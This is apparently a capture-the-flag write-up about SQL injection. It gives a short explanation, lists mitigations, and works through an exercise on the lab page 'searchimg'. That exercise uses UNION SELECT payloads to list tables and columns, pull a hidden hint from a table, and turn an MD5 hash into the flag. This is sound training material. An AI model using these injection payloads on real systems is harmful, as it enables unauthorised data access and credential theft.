# SQL Injection

SQL Injection (SQLi) is a type of injection attack where malicious SQL code is inserted into input fields, query strings, or HTTP headers with the intention of manipulating the application's interaction with its database.

If successful, an attacker can:

- **Read sensitive data** (e.g., user credentials, personal information)
- **Modify or delete data** (Insert, Update, Delete)
- **Perform administrative operations** on the database (e.g., shutdown, drop tables)
- **Access system files** stored on the database server
- **Execute OS-level commands** (in some configurations)

SQL Injection occurs when input is not properly validated or sanitized, allowing attacker-supplied input to be executed as part of a SQL query.

## Mitigations
To protect your application from SQL Injection:
- Use parameterized queries (also known as prepared statements) with bound parameters.
- Avoid dynamic SQL construction using user input.
- Use ORM (Object-Relational Mapping) frameworks which safely abstract SQL queries (when used correctly).
- Escape and sanitize input data if query construction is unavoidable (e.g., LIKE clauses with wildcards).
- Enforce least privilege on database users — avoid using accounts with admin rights.
- Validate input data strictly (e.g., length, type, format, and range).
- Use stored procedures that do not concatenate user input into queries.
- Monitor and log all database errors and query behavior for suspicious activity.
- Disable detailed SQL errors in production to prevent leakage of database structure or logic.

## References
- [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

## Exercise
Same as in previous SQL Injection exercise, on index.html?page=searchimg, we tried to inject MariaDB tables.

1. Identify existing tables in the DB with union select,
```
1 UNION SELECT table_name, NULL FROM information_schema.tables #
```
Results: 
```
ID: 1 UNION SELECT table_name, NULL FROM information_schema.tables  
First name: db_default
Surname : 

ID: 1 UNION SELECT table_name, NULL FROM information_schema.tables # 
First name: users
Surname : 

ID: 1 UNION SELECT table_name, NULL FROM information_schema.tables # 
First name: guestbook
Surname : 

ID: 1 UNION SELECT table_name, NULL FROM information_schema.tables # 
First name: list_images
Surname : 

ID: 1 UNION SELECT table_name, NULL FROM information_schema.tables # 
First name: vote_dbs
Surname : 

2. Get exisiting columns
1 UNION SELECT column_name, NULL FROM information_schema.columns

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: username
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: password
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: user_id
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: first_name
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: last_name
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: town
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: country
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: planet
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: Commentaire
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: countersign
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: id_comment
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: url
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: title
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: id_vote
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: vote
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: nb_vote
Surname : 

ID: 1 UNION SELECT column_name, NULL FROM information_schema.columns 
First name: subject
Surname : 
```

2. Each combination of column names has been verified, until we get following result:
```
ID: 1 UNION SELECT title, url FROM list_images# 
Title: borntosec.ddns.net/images.png
Url : Hack me ?

ID: 1 UNION SELECT title, comment FROM list_images # 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```

3. We follow the hint and get the flag.
1928e8083cf461a51303633093573c46 (md5) -> albatroz
```
sha256 -s albatroz
```